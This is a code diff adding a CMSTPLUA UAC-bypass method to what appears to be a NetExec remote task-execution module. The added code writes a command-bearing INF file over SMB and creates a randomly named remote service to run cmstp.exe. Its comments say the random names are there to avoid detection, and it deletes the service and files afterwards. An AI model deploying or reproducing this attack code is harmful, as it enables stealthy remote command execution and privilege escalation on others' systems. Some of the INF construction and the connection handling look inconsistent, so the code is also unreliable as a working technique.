@@ -5,6 +5,7 @@ from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVE
 from nxc.helpers.misc import gen_random_string
 from time import sleep
 from datetime import datetime, timedelta
+import random
 
 
 class TSCH_EXEC:
@@ -216,3 +217,153 @@ class TSCH_EXEC:
                     pass
 
         dce.disconnect()
+
+    def __bypassuac_cmstplua(self, command):
+        """
+        Implements CMSTPLUA UAC bypass - exploits the fact that 
+        cmstp.exe auto-elevates and we can use network paths to bypass UAC restrictions.
+        This is a more direct bypass that uses cmstp.exe's COM object auto-elevation.
+        """
+        # Create random filenames to avoid detection
+        output_file = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
+        inf_file = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
+        self.__output_filename = output_file
+        
+        # Use the main TSCH_EXEC SMB connection (self.conn)
+        
+        try:
+            # Ensure the main SMB connection is established
+            if not hasattr(self, 'conn') or not self.conn:
+                self.logger.debug("Main SMB connection not found or initialized in __bypassuac_cmstplua, establishing...")
+                # Assuming self.connect() initializes self.conn appropriately
+                # If self.connect() isn't the right method, this needs adjustment
+                # based on how TSCH_EXEC establishes its primary SMB connection.
+                # For now, we rely on the structure where self.conn is expected
+                # to be available after TSCH_EXEC initialization.
+                # If direct initialization is needed, it might look like:
+                # self.connect() # Re-evaluate if this truly sets self.conn
+                # Or perhaps self.conn = self.__rpctransport.get_smb_connection() after __rpctransport.connect()
+                # We need to ensure self.conn is a valid SMBConnection object here.
+                # Adding a direct call to self.connect() as a safety measure.
+                self.connect()
+
+            # Create the INF file content for CMSTP
+            # This will execute our command via a COM object method
+            inf_content = f"""[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall_SingleUser]
+UnRegisterOCXs=UnRegisterOCXSection
+
+[UnRegisterOCXSection]
+%SystemRoot%\\\\system32\\\\scrobj.dll,NI,{{00000000-0000-0000-0000-0000DEADBEEF}}
+
+[{{00000000-0000-0000-0000-0000DEADBEEF}}]
+2,"""
+            
+            # Prepare command with UNC path for output
+            if self.__retOutput:
+                cmd = f'cmd.exe /c "{command} > \\\\\\\\127.0.0.1\\\\{self.__share}\\\\{output_file} 2>&1"'
+            else:
+                cmd = f'cmd.exe /c "{command}"'
+                
+            # Add our command to the INF
+            inf_content += f'"{cmd}"'
+            
+            # Write the INF file to the C$ share using self.conn
+            self.logger.debug(f"Writing INF file to {self.__share}\\\\\\\\{inf_file}.inf")
+            self.conn.putFile(self.__share, f"{inf_file}.inf", inf_content.encode())
+            
+            # Create a service to run CMSTP with our INF file
+            scm_rpctransport = transport.DCERPCTransportFactory(r"ncacn_np:%s[\\\\pipe\\\\svcctl]" % self.__target)
+            if hasattr(scm_rpctransport, "set_credentials"):
+                scm_rpctransport.set_credentials(
+                    self.__username, self.__password, self.__domain,
+                    self.__lmhash, self.__nthash, self.__aesKey
+                )
+                scm_rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)
+            
+            scm_dce = scm_rpctransport.get_dce_rpc()
+            if self.__doKerberos:
+                scm_dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+            
+            scm_dce.connect()
+            
+            from impacket.dcerpc.v5 import svcctl
+            scm_dce.bind(svcctl.MSRPC_UUID_SCMR)
+            
+            # Create a new service to launch CMSTP
+            resp = svcctl.hROpenSCManagerW(scm_dce)
+            sc_handle = resp['lpScHandle']
+            
+            # Random service name
+            service_name = ''.join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(8))
+            
+            # Create command to run CMSTP with our INF file using a UNC path
+            cmstp_cmd = f'C:\\\\Windows\\\\System32\\\\cmstp.exe /s /au C:\\\\{inf_file}.inf'
+            
+            # Create service to run CMSTP
+            resp = svcctl.hRCreateServiceW(
+                scm_dce,
+                sc_handle,
+                service_name + '\\x00',
+                service_name + '\\x00',
+                lpBinaryPathName=cmstp_cmd + '\\x00',
+                dwStartType=svcctl.SERVICE_DEMAND_START
+            )
+            
+            service_handle = resp['lpServiceHandle']
+            
+            # Start the service to trigger CMSTP
+            self.logger.debug(f"Starting service to execute CMSTP with our INF file")
+            svcctl.hRStartServiceW(scm_dce, service_handle)
+            
+            # Wait for execution
+            sleep(4)
+            
+            # Clean up service and INF file
+            self.logger.debug("Cleaning up service and INF file")
+            svcctl.hRDeleteService(scm_dce, service_handle)
+            svcctl.hRCloseServiceHandle(scm_dce, service_handle)
+            
+            try:
+                # Use self.conn to delete the file
+                self.conn.deleteFile(self.__share, f"{inf_file}.inf")
+            except Exception as e:
+                self.logger.debug(f"Error deleting INF file: {e}")
+            
+            # If output was requested, get the file
+            if self.__retOutput:
+                # Wait for command execution
+                sleep(2)
+                
+                self.__outputBuffer = b""
+                
+                # Try to get the output file using self.conn
+                for attempt in range(self.__tries):
+                    try:
+                        self.logger.info(f"Attempting to read {self.__share}\\\\\\\\{output_file}")
+                        self.conn.getFile(self.__share, output_file, self.output_callback)
+                        break
+                    except Exception as e:
+                        if attempt == self.__tries - 1:
+                            self.logger.debug(f"Failed to get output after {self.__tries} attempts: {e}")
+                        else:
+                            self.logger.debug(f"Error getting output (attempt {attempt+1}/{self.__tries}): {e}")
+                            sleep(2)
+                # Clean up the output file using self.conn
+                try:
+                    self.logger.debug(f"Deleting output file: {output_file}")
+                    self.conn.deleteFile(self.__share, output_file)
+                except Exception as e:
+                    self.logger.debug(f"Error deleting output file: {e}")
+            # Ensure connection is closed
+            scm_dce.disconnect()
+            
+            return self.__outputBuffer
+            
+        except Exception as e:
+            self.logger.debug(f"UAC bypass via CMSTPLUA failed: {str(e)}")
+            # Re-raise to try the next method
+            raise e
